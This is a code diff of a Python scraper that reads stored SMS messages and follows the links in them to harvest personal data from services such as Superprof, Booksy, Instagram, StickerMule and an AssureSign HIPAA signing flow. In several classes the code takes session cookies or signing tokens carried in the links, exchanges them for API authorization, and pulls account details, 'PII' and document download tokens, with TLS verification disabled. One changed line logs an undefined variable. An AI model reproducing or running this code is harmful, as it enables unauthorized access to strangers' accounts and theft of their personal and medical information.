@@ -8,7 +8,8 @@ from io import StringIO
 
 # Project
 from database.database import DatabaseInterface
-from database.models import SMS
+from database.models import AuditLog
+from database.models import Data
 from config.config import Phone
 from config.config import Logger
 from config.config import Config
@@ -33,13 +34,18 @@ class DataModule:
             self.smss = DatabaseInterface.get_sms_by_url(self.base_url)
             if self.smss:
                 for sms in self.smss:
-                    #DATA - Mock - run - 'Mock' object has no attribute 'data'
-                    sms_id  = sms[0]
-                    url     = sms[1]
-                    msg     = sms[2]
-                    data    = self.retrieve_data(url, msg)
-                    if data:
-                        self.populate_database(sms_id, data)
+                    # Retrieve inputs
+                    sms_id      = sms[0]
+                    url         = sms[1]
+                    msg         = sms[2]
+
+                    # Generate data
+                    raw         = self.retrieve_data(url, msg)
+                    email       = self.retrieve_email(raw)
+                    username    = self.retrieve_username(raw)
+                    if raw:
+                        data = Data(None, username, email, raw, sms_id)
+                        data.insert()
 
         except Exception as e:
             raise Exception("Data module - " + str(e))
@@ -53,7 +59,13 @@ class DataModule:
 
     def retrieve_data(self, url, msg):
         return None
-
+    
+    def retrieve_email(self, data):
+        return None
+    
+    def retrieve_username(self, data):
+        return None
+    
     def _retrieve_data_in_msg(self, msg):
         return None
 
@@ -62,7 +74,7 @@ class DataModule:
             # Get additional data
             data = {}
             resp = requests.get(url, allow_redirects=False, verify=False)
-            DatabaseInterface.log(resp)
+            AuditLog(resp).log()
             redirect_url = resp.headers['Location']
             if redirect_url:
                 params = redirect_url.split('?')[1]
@@ -102,7 +114,7 @@ class Instagram(DataModule):
             self.current_url = self.current_url[:l-1]
 
         source  = requests.get(self.current_url, allow_redirects=False)
-        DatabaseInterface.log(source)
+        AuditLog(source).log()
         next_url = source.headers['Location']
         
         # Handle mobile shit
@@ -114,7 +126,7 @@ class Instagram(DataModule):
     def _parse_instagram(self):
         # Send request and parse it
         resp = requests.get(self.current_url, allow_redirects=True)
-        DatabaseInterface.log(resp)
+        AuditLog(resp).log()
         soup = BeautifulSoup(resp.text, features="lxml")
 
         try:
@@ -186,7 +198,7 @@ class Superprof(DataModule):
     def retrieve_data(self, url, msg):
         # Access app and get SESSION cookie
         response    = requests.get(url, allow_redirects=False, verify=False)
-        DatabaseInterface.log(response)
+        AuditLog(response).log()
         cookies     = response.headers['Set-Cookie']
         cookie      = re.search(r'PHPSESSID=.*;', cookies).group(0)
         session_cookie_k    = cookie.split('=')[0]
@@ -196,14 +208,14 @@ class Superprof(DataModule):
         # Use SESSION cookie to get API Authorization token
         url = self.base_url + 'api/v3/authorize/'
         response    = requests.get(url, allow_redirects=False, verify=False, cookies=session_cookie)
-        DatabaseInterface.log(response)
+        AuditLog(response).log()
         data        = response.json()
         token       = data['token_type'] + ' ' + data['access_token']
         headers     = {'Authorization': token}
         # Get data
         url = self.base_url + 'api/v3/me/'
         response    = requests.get(url, allow_redirects=False, verify=False, cookies=session_cookie, headers=headers)
-        DatabaseInterface.log(response)
+        AuditLog(response).log()
         if response.json():
             return response.json()
         return None
@@ -242,7 +254,7 @@ class Booksy(DataModule):
         try:
             # Send request and parse
             resp = requests.get(url, allow_redirects=False)
-            DatabaseInterface.log(resp)
+            AuditLog(resp).log()
             
             # Parse
             soup = BeautifulSoup(resp.text, features="lxml")
@@ -270,7 +282,7 @@ class Lilly(DataModule):
         if 'HIPAA' in msg:
             # Request 1 - Get session information
             resp = requests.get(url, allow_redirects=True)
-            DatabaseInterface.log(resp)
+            AuditLog(resp).log()
             # Parse
             soup        = BeautifulSoup(resp.text, features="lxml")
             hidden_tags = soup.find("input", type="hidden")
@@ -286,20 +298,20 @@ class Lilly(DataModule):
             url     = "https://www.assuresign.net/api/signing/v1/unauthenticatedModel/" + signatory_id + "?bypassLanding=false&suppressHeader=false&redirectUrl="
             headers = {'Authorization': 'SigningSessionToken ' + str(session_token), 'SigningSmsAuthExpiration':'SigningSmsAuthExpirationToken', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0', 'X-Requested-With':'XMLHttpRequest'}
             r       = requests.get(url, headers=headers)
-            DatabaseInterface.log(r)
+            AuditLog(r).log()
             session_token = r.headers['SigningSessionToken']
 
             # Request 3 - Authenticate and get PII
             url     = "https://www.assuresign.net/api/signing/v1/authenticatedModel/" + signatory_id
             headers = {'Authorization': 'SigningSessionToken ' + str(session_token), 'SigningSmsAuthExpiration':'SigningSmsAuthExpirationToken', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0', 'X-Requested-With':'XMLHttpRequest'}
             r       = requests.get(url, headers=headers)
-            DatabaseInterface.log(r)
+            AuditLog(r).log()
             session = json.loads(r.text)['session']
 
             # Request 4 - Get document download token
             url     = "https://www.assuresign.net/api/signing/v1/downloadToken/document/" + document_id
             r       = requests.get(url, headers=headers)
-            DatabaseInterface.log(r)
+            AuditLog(r).log()
             token   = json.loads(r.text)['downloadToken']
 
             # Data
@@ -342,7 +354,7 @@ class StickerMule(DataModule):
     def _parse_stickermule(self):
         # Send request and parse it
         resp = requests.get(self.current_url, allow_redirects=True)
-        DatabaseInterface.log(resp)
+        AuditLog(r).log()
         try:
             soup = BeautifulSoup(resp.text, features="lxml")
             stickermule_data = json.loads(soup.find('script', {'id':'__NEXT_DATA__'}).text)
